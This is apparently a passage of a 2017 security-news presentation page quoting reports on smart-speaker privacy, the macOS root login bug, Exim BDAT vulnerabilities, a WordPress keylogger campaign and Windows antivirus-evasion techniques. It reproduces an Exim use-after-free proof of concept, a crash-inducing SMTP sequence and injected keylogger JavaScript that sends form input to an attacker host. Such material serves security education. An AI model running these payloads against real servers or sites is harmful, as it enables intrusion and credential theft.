<div><p>Three years ago, we <a class="reference external" href="https://gizmodo.com/amazons-echo-might-be-its-most-important-product-in-yea-1655513291">said</a> the Echo was “the most innovative device Amazon’s made in years.” That’s still true. But you shouldn’t buy one. … In fact, ignore any praise we’ve ever heaped onto smart speakers and voice-controlled assistants. They’re bad!</p>
<p>Let me make this point dreadfully clear, though: Your family members do not need an Amazon Echo or a Google Home or an Apple HomePod or whatever that one smart speaker that uses Cortana is called. And you don’t either. … You probably think that having an always-on microphone in your home is fine, and furthermore, tech companies only record and store snippets of your most intimate conversations.</p>
<p>By buying a smart speaker, you’re effectively paying money to let a huge tech company surveil you. … Amazon, Google, Apple, and others say that their devices aren’t spying on unsuspecting families. The only problem is that these gadgets are both hackable and prone to bugs.</p>
<p>The same companies are less explicit about what they’re doing with all that data. They’re also vague about whether they might share voice recordings with developers in the future. Amazon, at least, <a class="reference external" href="https://www.theverge.com/2017/7/12/15960596/amazon-alexa-echo-speaker-audio-recordings-developers-data">seems open to the idea</a>.</p>
<p>We do know that Amazon will hand over your Echo data if the gadget becomes involved in a homicide investigation. … It remains unclear how government agencies like the FBI, CIA, and NSA are treating smart speakers, too. The FBI, for one, would neither confirm nor deny wiretapping Amazon Echo devices when Gizmodo asked the agency about it last year.</p>
<p>… Anything that’s connected to the internet is potentially vulnerable to intrusions, but as a new category of devices, smart speakers are simply untested in the security arena. … Not long after its launch, the Google Home Mini <a class="reference external" href="http://www.androidpolice.com/2017/10/10/google-nerfing-home-minis-mine-spied-everything-said-247/">experienced a bug</a> that led to the device recording everything happening in a technology reporter’s house for dozens of hours.</p>
</div></blockquote>
<p>From (the above) link <a class="reference external" href="https://www.theverge.com/2017/7/12/15960596/amazon-alexa-echo-speaker-audio-recordings-developers-data">Amazon may give app developers access to Alexa audio recordings</a>:</p>
<blockquote>
<div><p>Amazon is considering granting third-party app developers access to transcripts of audio recordings saved by Alexa-powered devices, according to a <a class="reference external" href="https://www.theinformation.com/facing-new-rivals-amazon-may-open-up-alexa-data-for-developers">report from The Information today</a>.</p>
<p>The data is also kept in the event it’s request by law enforcement, however Amazon fought police over what it saw as an <a class="reference external" href="https://www.theverge.com/2016/12/27/14089836/amazon-echo-privacy-criminal-investigation-data">overly broad request for audio logs on a murder suspect</a> last year. (The company relented in April of this year and <a class="reference external" href="http://www.cnn.com/2017/03/07/tech/amazon-echo-alexa-bentonville-arkansas-murder-case/index.html">handed over the logs</a> when the suspect voluntarily said he was willing to provide them.)</p>
<p>Amazon does not hand this data over to developers, <em>The Information</em> says, because such a move would undermine Amazon’s commitment to user privacy. However, because Google, which makes the most popular Echo competitor currently on the market, does give developers access to this data, Amazon’s Echo and Alexa divisions feel they are at a disadvantage, the report states. Google did not immediately respond to a request for comment on its data-sharing policies for the Home speaker.</p>
</div></blockquote>
</div>
</div>
<div class="section" id="macos-allows-login-as-root">
<h3>11.35.2.3. macOS allows login as root<a class="headerlink" href="#macos-allows-login-as-root" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2017-13872">CVE-2017-13872</a> is a serious vulnerability that</p>
<blockquote>
<div>… allows attackers to obtain administrator access without a password via certain interactions involving entry of the root user name.</div></blockquote>
<p>From <a class="reference external" href="https://objective-see.com/blog/blog_0x24.html">Why &lt;blank&gt; Gets You Root</a>:</p>
<blockquote>
<div>When a user (or attacker) attempts to log into an account that is not currently enabled (i.e. root), the system will create that account with whatever password the user specifies…even if that password is blank. Then the user (or attacker) can readily log into that account …</div></blockquote>
<p>Continuing on in the article, it was first posted on Nov 13, 2017:</p>
<blockquote>
<div><p>rather innocuously, to Apple’s very own Developer Formums…in order to aid a user …</p>
<p>However, the flaw only gained wider public attention, when Lemi Orhan Ergin (<a class="reference external" href="https://twitter.com/lemiorhan">&#64;lemiorhan</a>) posted a <a class="reference external" href="https://twitter.com/lemiorhan/status/935578694541770752">tweet</a> stating that, “we noticed a <em>HUGE</em> security issue at MacOS High Sierra…”:</p>
<p>Let’s recap:</p>
<ul class="simple">
<li>For accounts that are disabled (i.e. don’t have ‘shadowhash’ data) macOS will attempt to perform an upgrade</li>
<li>During this upgrade, od_verify_crypt_password returns a non-zero value, and an error code which is not checked</li>
<li>The user (or attacked) specified password is then ‘upgraded’ and saved for the account</li>
</ul>
</div></blockquote>
<p><a class="reference external" href="https://support.apple.com/en-us/HT208315">About the security content of Security Update 2017-001</a> describes how to check that the patch has been applied.</p>
<p>From <a class="reference external" href="https://www.reuters.com/article/us-apple-cyber/apple-to-audit-development-processes-after-mac-bug-discovered-idUSKBN1DT2TJ">Apple to audit development processes after Mac bug discovered</a>:</p>
<blockquote>
<div>Apple Inc (AAPL.O) said on Wednesday it would review its software development process a day after a researcher discovered a bug in a new version of its Mac operating system that could give hackers total control of vulnerable machines.</div></blockquote>
</div>
<div class="section" id="exim-rce-and-dos">
<h3>11.35.2.4. Exim RCE and DoS<a class="headerlink" href="#exim-rce-and-dos" title="Permalink to this headline">¶</a></h3>
<div class="section" id="exim-usage-and-bdat">
<h4>11.35.2.4.1. Exim usage and BDAT<a class="headerlink" href="#exim-usage-and-bdat" title="Permalink to this headline">¶</a></h4>
<p>Note: from <a class="reference external" href="http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html">Mail (MX) Server Survey</a> Exim ran 56.64% of the 1,016,147 servers that were able to be fingerprinted. So bugs are a big deal.</p>
<p>Note: for details of SMTP BDAT see <a class="reference external" href="https://tools.ietf.org/html/rfc3030">RFC 3030</a> SMTP Service Extensions for Transmission of Large and Binary MIME Messages.</p>
</div>
<div class="section" id="cve-2017-16943-and-cve-2017-16944">
<h4>11.35.2.4.2. CVE-2017-16943 and CVE-2017-16944<a class="headerlink" href="#cve-2017-16943-and-cve-2017-16944" title="Permalink to this headline">¶</a></h4>
<p>There are 2 bugs resulting in 2 CVEs: <a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2017-16943">CVE-2017-16943</a> and <a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2017-16944">CVE-2017-16944</a>. The more serious is the remote code execution in CVE-2017-16943:</p>
<blockquote>
<div>The receive_msg function in receive.c in the SMTP daemon in Exim 4.88 and 4.89 allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free) via vectors involving BDAT commands.</div></blockquote>
<p>The (RCE) bug was reported as <a class="reference external" href="https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html">[exim-announce] Critical Exim Security Vulnerability: disable chunking</a>:</p>
<blockquote>
<div><p>A remote code execution vulnerability has been reported in Exim, with immediate public disclosure (we were given no private notice).</p>
<p>With immediate effect, please apply this workaround: if you are running Exim 4.88 or newer (4.89 is current, 4.90 is upcoming) then in the main section of your Exim configuration, set:</p>
<blockquote>
<div>chunking_advertise_hosts =</div></blockquote>
<p>That’s an empty value, nothing on the right of the equals. This disables advertising the ESMTP CHUNKING extension, making the BDAT verb unavailable and avoids letting an attacker apply the logic.</p>
<p>This should be a complete workaround. Impact of applying the workaround is that mail senders have to stick to the traditional DATA verb instead of using BDAT.</p>
</div></blockquote>
<p>This bug was reported publically via <a class="reference external" href="https://bugs.exim.org/show_bug.cgi?id=2199">Bug 2199 - Exim use-after-free vulnerability while reading mail header</a>:</p>
<blockquote>
<div><p>Hi, we found a use-after-free vulnerability which is exploitable to RCE in the SMTP server.</p>
<p>To trigger this bug, BDAT command is necessary to perform an allocation by raising an error. Through our research, we confirm that this vulnerability can be exploited to remote code execution if the binary is not compiled with PIE.</p>
<p>An RIP controlling PoC is in attachment poc.py. The following is the gdb result of this PoC:</p>
<blockquote>
<div>Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
(gdb)</div></blockquote>
<p>By the way, I want to apologize for accidentally making this bug public directly. I read SecurityReleaseProcess in wiki, googled and didn’t find an email address to report. So I decided to report to this bugzilla and did not notice any option to set it private (and I thought maybe security issues are default to private). Anyway, I see the notification in report process now. Sorry for that.</p>
<p>The notification is new, part of “lessons learned”.  You didn’t miss it, I added it in reaction to this incident.</p>
<p>We should have had something clearer up before.  We didn’t.  Shit happens, we pick ourselves back up, learn from it, fix things and move on.</p>
</div></blockquote>
<p>The attached PoC is:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># pip install pwntools</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;EHLO test&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;250 HELP&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;MAIL FROM:&lt;test@localhost&gt;&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;RCPT TO:&lt;test@localhost&gt;&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="c1">#raw_input()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1100</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#raw_input()</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;BDAT 1&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;:BDAT </span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e00</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="o">+</span> <span class="s1">&#39;:</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">)</span>
<span class="c1">#raw_input()</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="nb">exit</span><span class="p">()</span>
</pre></div>
</div>
<p>The second (DoS) bug was reported as <a class="reference external" href="https://bugs.exim.org/show_bug.cgi?id=2201">Bug 2201 - Exim handles BDAT data incorrectly and leads to crash</a>:</p>
<blockquote>
<div><p>While parsing BDAT data header, exim still scans for ‘.’ and consider it the end of mail.</p>
<blockquote>
<div><a class="reference external" href="https://github.com/Exim/exim/blob/master/src/src/receive.c#L1867">https://github.com/Exim/exim/blob/master/src/src/receive.c#L1867</a></div></blockquote>
<p>Exim goes into an incorrect state after this message is sent because the function pointer receive_getc is not reset. If the following command is also a BDAT, receive_getc and lwr_receive_getc become the same and an infinite loop occurs inside bdat_getc. Program crashes due to running out of stack.</p>
<blockquote>
<div><a class="reference external" href="https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L547">https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L547</a></div></blockquote>
<p>Here is a simple PoC which leads to an infinite loop and program crash:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>```
EHLO localhost
MAIL FROM:&lt;test@localhost&gt;
RCPT TO:&lt;test@localhost&gt;
BDAT 10
.
BDAT 0
```
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="exim-code">
<h4>11.35.2.4.3. Exim code<a class="headerlink" href="#exim-code" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="http://seclists.org/oss-sec/2017/q4/325">RCE in Exim reported</a>:</p>
<blockquote>
<div>Chunking support was introduced with Exim 4.88; the current release is 4.89, 4.90 is in RC series now, it looks like a 2-line fix (written by Jeremy Harris) is probably right for the first issue.</div></blockquote>
<p>From <a class="reference external" href="https://github.com/Exim/exim">Exim Development Repository - Development Repositories</a>:</p>
<blockquote>
<div><p>Exim development is kept within a git (<a class="reference external" href="https://git-scm.com/">https://git-scm.com/</a>) repository. The master repository is at git://git.exim.org/exim.git with a web interface giving change and source visibility at https://git.exim.org/exim.git</p>
<p>There is a secondary repository on github at <a class="reference external" href="https://github.com/Exim/exim">https://github.com/Exim/exim</a> managed by the Exim Organisation - however this may currently fall out of synchronisation with the main one.</p>
</div></blockquote>
<p>The original bug report was probably using Exim 4.89, so from <a class="reference external" href="https://git.exim.org/exim.git">exim.git</a> the tag <a class="reference external" href="https://git.exim.org/exim.git/tag/6b1afefb1101885f2a13aeabe600aff68fc4afe5">exim-4_89 tag</a>, then <a class="reference external" href="https://git.exim.org/exim.git/commit/38903fb5b864ee99904d035337c66891604d9678">exim-4_89 commit</a>, then <a class="reference external" href="https://git.exim.org/exim.git/tree/38903fb5b864ee99904d035337c66891604d9678">exim-4_89 tree</a> shows the code base for exim 4.89. Browse through <code class="file docutils literal notranslate"><span class="pre">src/src/</span></code> to the blob for <a class="reference external" href="https://git.exim.org/exim.git/blob/38903fb5b864ee99904d035337c66891604d9678:/src/src/receive.c">exim-4_89 receive.c</a> and  <a class="reference external" href="https://git.exim.org/exim.git/blob/38903fb5b864ee99904d035337c66891604d9678:/src/src/store.c">exim-4_89 store.c</a> whose code lines are the same as bug 2199.</p>
<p>The code change for bug 2199 is at <a class="reference external" href="https://git.exim.org/exim.git/blobdiff/ef9da2ee969c27824fcd5aed6a59ac4cd217587b..4e6ae6235c68de243b1c2419027472d7659aa2b4:/src/src/receive.c">Avoid release of store if there have been later allocations. Bug 2199</a>.</p>
<p>On GitHub, to see the changes from exim-4_87 to exim-4_88 can be see via <a class="reference external" href="https://github.com/Exim/exim/compare/exim-4_87...exim-4_88">https://github.com/Exim/exim/compare/exim-4_87…exim-4_88</a> or you can use git:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">git clone git://git.exim.org/exim.git
</span><span class="nb">cd</span> exim
<span class="hll">git branch -a
</span><span class="c1"># git fetch --all --tags --prune</span>
<span class="hll">git tag
</span><span class="hll">git diff --name-status exim-4_87..exim-4_88
</span>git diff --name-status master..exim-4_87
<span class="hll">git diff master..exim-4_87 src/src/receive.c
</span><span class="hll">git diff master..exim-4_87 src/src/store.c
</span>git checkout tags/exim-4_87 -b buggy
</pre></div>
</div>
</div>
</div>
<div class="section" id="wordpress-sites-infected-with-keylogger">
<h3>11.35.2.5. WordPress sites infected with keylogger<a class="headerlink" href="#wordpress-sites-infected-with-keylogger" title="Permalink to this headline">¶</a></h3>
<p>This <a class="reference external" href="https://blog.sucuri.net/2017/12/cloudflare-solutions-keylogger-on-thousands-of-infected-wordpress-sites.html">Cloudflare[.]Solutions Keylogger on Thousands of Infected WordPress Sites</a>:</p>
<blockquote>
<div><p>A few weeks ago, <a class="reference external" href="http://labs.sucuri.net/?note=2017-11-24">we wrote</a> about a massive WordPress infection that injected an obfuscated script pretending to be jQuery and Google Analytics. In reality, this script loaded a <a class="reference external" href="https://blog.sucuri.net/2017/09/hacked-websites-mine-crypocurrencies.html">CoinHive cryptocurrency miner</a> from a third-party server.</p>
<p>We also mentioned a post written back in April that described the <a class="reference external" href="http://labs.sucuri.net/?note=2017-04-03">cloudflare.solutions</a> malware, which came along with the cryptominers. At this moment, <a class="reference external" href="https://publicwww.com/websites/%22cloudflare.solutions%2Fajax%22/">PublcWWW reports</a> there are 5,482 sites infected with this malware. It seems that this evolving campaign is now adding keyloggers to the mix.</p>
<p><strong>Fake linter.js URLs Turn Into a Keylogger</strong></p>
<p>… you realize that the cdnjs.cloudflare.com is just a red herring and the real payloads are those hexadecimal numbers after the question mark in the URLs. The script decodes them and injects the following result into web pages:</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="kd">function</span> <span class="nx">process_event</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span>    <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
<span class="hll">        <span class="nx">key</span><span class="o">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span>
</span><span class="hll">        <span class="nx">element</span><span class="o">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">id</span>
</span>    <span class="p">});</span>
<span class="hll">    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
</span><span class="p">}</span>

<span class="hll"><span class="kd">var</span> <span class="nx">i_fields</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">);</span>
</span><span class="hll"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">i_fields</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="hll">    <span class="nx">i_fields</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;blur&#39;</span><span class="p">,</span> <span class="nx">process_event</span><span class="p">);</span>
</span><span class="hll"><span class="p">}</span>
</span></pre></div>
</div>
<p>As you can see, it’s a <strong>keylogger</strong>. This script adds a handler to every <strong>input</strong> field on the websites to send its value to the attacker (<strong>wss://cloudflare[.]solutions:8085/</strong>) when a user leaves that field.</p>
<p>Given the keylogger functionality of this malware, you should consider all WordPress passwords compromised so the next mandatory step of the cleanup is changing the passwords (actually it is highly recommended after any site hack).</p>
</div></blockquote>
</div>
<div class="section" id="bypassing-av">
<h3>11.35.2.6. Bypassing AV<a class="headerlink" href="#bypassing-av" title="Permalink to this headline">¶</a></h3>
<div class="section" id="avgater">
<h4>11.35.2.6.1. AVGater<a class="headerlink" href="#avgater" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/">#AVGater: Getting Local Admin by Abusing the Anti-Virus Quarantine</a>:</p>
<blockquote>
<div><p>#AVGater can be used to restore a previously quarantined file to any arbitrary filesystem location. This is possible because the restore process is most often carried out by the privileged AV Windows user mode service. Hence, file system ACLs can be circumvented (as they don’t really count for the SYSTEM user). This type of issue is called a privileged file write vulnerability and can be used to place a malicious DLL anywhere on the system. The goal is to side load this library for a legitimate Windows servers by abusing the DLL Search Order …</p>
<p>But there is still one very important question still unanswered: How is it possible to tamper with the restore process? The solution are NTFS directory junctions. They are basically symbolic links for directories that can be created by anyone with the help of <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc753194%28v=ws.11%29.aspx?f=255&amp;MSPPError=-2147217396">mklink</a>.</p>
<p>By abusing NTFS directory junctions, the AV quarantine restore process can be manipulated, so that previously quarantined files can be written to arbitrary file system locations.</p>
</div></blockquote>
<p>From <a class="reference external" href="https://arstechnica.com/information-technology/2017/11/how-av-can-open-you-to-attacks-that-otherwise-wouldnt-be-possible/">How AV can open you to attacks that otherwise wouldn’t be possible</a>:</p>
<blockquote>
<div><p>Bogner said he developed a series of AVGater exploits during several assignments that called for him to penetrate deep inside customer networks. Using malicious phishing e-mails, he was able to infect employee PCs, but he still faced a significant challenge. Because company administrators set up the PCs to run with limited system privileges, Bogner’s malware was unable to access the password database—known as the Security Account Manager—that stored credentials he needed to pivot onto the corporate network.</p>
<p>“With the help of AVGater, I gained local admin privileges,” Bogner wrote in an e-mail.</p>
<p>As a general rule, people who aren’t likely to be narrowly targeted in attacks are probably better off running Windows Defender or another name-brand AV engine. Journalists, lawyers, and activists, on the other hand, should weigh the benefits and risks on a case-by-case basis.</p>
</div></blockquote>
</div>
<div class="section" id="process-doppelganging">
<h4>11.35.2.6.2. Process Doppelgänging<a class="headerlink" href="#process-doppelganging" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://www.bleepingcomputer.com/news/security/-process-doppelg-nging-attack-works-on-all-windows-versions/">“Process Doppelgänging” Attack Works on All Windows Versions</a>:</p>
<blockquote>
<div>Research material on Process Doppelgänging will be published on the <a class="reference external" href="https://www.blackhat.com/eu-17/briefings.html#lost-in-transaction-process-doppelg%C3%A4nging">Black Hat website</a> in the following days.</div></blockquote>
<p>So we don’t have a lot of detail right now. But continuing on from the Dec 7, 2017 article:</p>
<blockquote>
<div><p>This new attack works on all Windows versions and researchers say it bypasses most of today’s major security products.</p>
<p>Process Doppelgänging … utilizes the Windows mechanism of <a class="reference external" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363764">NTFS Transactions</a>.</p>
</div></blockquote>
<p>From blackhat Europe 2017 Briefings - December 6 &amp; 7 <a class="reference external" href="https://www.blackhat.com/eu-17/briefings.html#lost-in-transaction-process-doppelg%C3%A4nging">Lost in Transaction: Process Doppelgänging</a>:</p>
<blockquote>
<div>Doppelgänging works by utilizing two key distinct features together to mask the loading of a modified executable. By using NTFS transactions, we make changes to an executable file that will never actually be committed to disk. We will then use undocumented implementation details of the process loading mechanism to load our modified executable, but not before rolling back the changes we made to the executable. The result of this procedure is creating a process from the modified executable, while deployed security mechanisms remain in the dark.</div></blockquote>
<p>From <a class="reference external" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363764">NTFS Transactions</a>:</p>
<blockquote>
<div><p>Most modern evasion techniques rely on complex memory manipulation in order to avoid AV/NGAV scan engines. Instead, we wanted to take advantage of the implementation of the Windows loader, and abuse it to load our code, while keeping it away from the prying eyes of security products. Moreover, the code will never be saved to any file on disk, making it invisible to most recording tools such as modern EDRs.</p>
<p>Microsoft strongly recommends developers utilize alternative means to achieve your application’s needs. Many scenarios that TxF was developed for can be achieved through simpler and more readily available techniques. Furthermore, TxF may not be available in future versions of Microsoft Windows. For more information, and alternatives to TxF, please see <a class="reference external" href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh802690">Alternatives to using Transactional NTFS</a>.</p>
<p>TxF can participate in distributed transactions that the Distributed Transaction Coordinator (DTC) coordinates, which allows you to use TxF for the following:</p>
<ul class="simple">
<li>Transactions that span multiple data stores, for example, a single transaction for file and SQL operations</li>
<li>Transactions that span multiple computers, for example, a single transaction for file updates on multiple computers</li>
</ul>
</div></blockquote>
<p>Back to <a class="reference external" href="https://www.bleepingcomputer.com/news/security/-process-doppelg-nging-attack-works-on-all-windows-versions/">“Process Doppelgänging” Attack Works on All Windows Versions</a>:</p>
<blockquote>
<div><p>Researchers sucessfully tested their attack on products from Kaspersky, Bitdefender, ESET, Symantec, McAfee, Windows Defender, AVG, Avast, Qihoo 360, and Panda. Furthermore, even advanced forensics tools such as Volatility will not detect it.</p>
<p>In their experiments, researchers used Process Doppelgänging to run Mimikatz, a known utility used for password-stealing operations, “in a stealthy way to avoid detection.”</p>
<p><strong>The good news and the bad news</strong></p>
<p>The good news is that “there are a lot of technical challenges” in making Process Doppelgänging work, and attackers need to know “a lot of undocumented details on process creation.”</p>
<p>The bad news is that the attack “cannot be patched since it exploits fundamental features and the core design of the process loading mechanism in Windows.”</p>
<p>Process Doppelgänging now joins the list of new attack methods discovered in the past year that are hard to detect and mitigate for modern AVs, such as <a class="reference external" href="https://blog.ensilo.com/atombombing-a-code-injection-that-bypasses-current-security-solutions">Atom Bombing</a>, <a class="reference external" href="https://www.bleepingcomputer.com/news/security/new-ghosthook-attack-bypasses-windows-patchguard-protections/">GhostHook</a>, and <a class="reference external" href="https://www.bleepingcomputer.com/news/security/researcher-details-new-windows-code-injection-technique-named-propagate/">PROPagate</a>.</p>
<p>Research material on Process Doppelgänging will be published on the Black Hat website in the following days.</p>
</div></blockquote>
</div>
<div class="section" id="atombombing">
<h4>11.35.2.6.3. AtomBombing<a class="headerlink" href="#atombombing" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://blog.ensilo.com/atombombing-a-code-injection-that-bypasses-current-security-solutions">AtomBombing: A Code Injection that Bypasses Current Security Solutions</a>:</p>
<blockquote>
<div><p>Our research team has uncovered new way to leverage mechanisms of the underlying Windows operating system in order to inject malicious code. Threat actors can use this technique, which exists by design of the operating system, to bypass current security solutions that attempt to prevent infection. We named this technique AtomBombing based on the name of the underlying mechanism that this technique exploits.</p>
<p>The underlying Windows mechanism which AtomBombing exploits is called atom tables. These tables are provided by the operating system to allow applications to store and access data. These atom tables can also be used to share data between applications.</p>
<p>What we found is that a threat actor can write malicious code into an atom table and force a legitimate program to retrieve the malicious code from the table. We also found that the legitimate program, now containing the malicious code, can be manipulated to execute that code.</p>
<p>For the technology deep dive, please the researcher’s post here: <a class="reference external" href="https://breakingmalware.com/injection-techniques/atombombing-brand-new-code-injection-for-windows/">https://breakingmalware.com/injection-techniques/atombombing-brand-new-code-injection-for-windows/</a></p>
<p>AtomBombing is performed just by using the underlying Windows mechanisms. There is no need to exploit operating system bugs or vulnerabilities.</p>
<p>Since the issue cannot be fixed, there is no notion of a patch for this. Thus, the direct mitigation answer would be to tech-dive into the API calls and monitor those for malicious activity.</p>
</div></blockquote>
</div>
<div class="section" id="id27">
<h4>11.35.2.6.4. GhostHook<a class="headerlink" href="#id27" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://www.bleepingcomputer.com/news/security/new-ghosthook-attack-bypasses-windows-patchguard-protections/">New GhostHook Attack Bypasses Windows PatchGuard Protections</a>:</p>
<blockquote>
<div><p>Security experts have discovered a method of bypassing Windows PatchGuard protections and hooking malicious code into the Windows kernel, which allows an attacker to plant rootkits on systems previously thought to be impregnable.</p>
<p>PatchGuard, known under its official name of Kernel Patch Protection (KPP), is a security feature for Windows 64-bit editions that prevents third-party code from patching the Windows kernel with additional routines.</p>
<p>Microsoft introduced PatchGuard in 2005, starting with Windows XP, and the feature has prevented most rootkits from working on 64-bit editions.</p>
<p>CyberArk says it contacted Microsoft about the GhostHook attack, but the OS maker declined to issue a security update. Microsoft said it might patch the issue during its regular bug fixing cycle, but would not treat GhostHook as a security flaw.</p>
<p>Microsoft justified its decision by saying that an attacker needs to have kernel-level access on an infected machine to perform a GhostHook attack. An attacker with kernel-level rights could perform many other malicious actions, and users should focus on preventing an attacker from gaining this much level of access in the first place.</p>
</div></blockquote>
</div>
<div class="section" id="id28">
<h4>11.35.2.6.5. PROPagate<a class="headerlink" href="#id28" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://www.bleepingcomputer.com/news/security/researcher-details-new-windows-code-injection-technique-named-propagate/">Researcher Details New Windows Code Injection Technique Named PROPagate</a>:</p>
<blockquote>
<div><p>A security researcher has discovered a new code injection technique that works on all recent Windows versions and allows miscreants to inject malicious code into other applications undetected.</p>
<p>Adam has discovered that he can abuse legitimate GUI window properties (UxSubclassInfo and CC32SubclassInfo) utilized internally by SetWindowSubclass function to load and execute malicious code inside other (legitimate) applications.</p>
<p><a class="reference external" href="http://www.hexacorn.com/blog/2017/11/03/propagate-a-new-code-injection-trick-64-bit-and-32-bit/">In subsequent research</a> Adam published last Friday, the expert also discovered that PROPagate code injection attacks work on both 32-bit and 64-bit processes, with little modifications.</p>
<p>Adam made it clear that this is not a serious cause for concern when compared to other types of security bugs, such as remote code execution or escalation of privileges.</p>
<p>“This is an evasion technique,” Adam told Bleeping Computer. “I didn’t contact Microsoft because it’s not an RCE or EoP and didn’t consider it is worth reporting.”</p>
<p>“To use the attack, one has to be already running some code on your system, i.e., it’s already game over, as such, it has a limited scope,” the expert added.</p>
</div></blockquote>
</div>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="20171202_presentation.html" class="btn btn-neutral float-right" title="11.36. 2017-12-02 Static websites, IME follow-up" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="20171216_presentation.html" class="btn btn-neutral" title="11.34. 2017-12-16 Mozilla Observatory" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
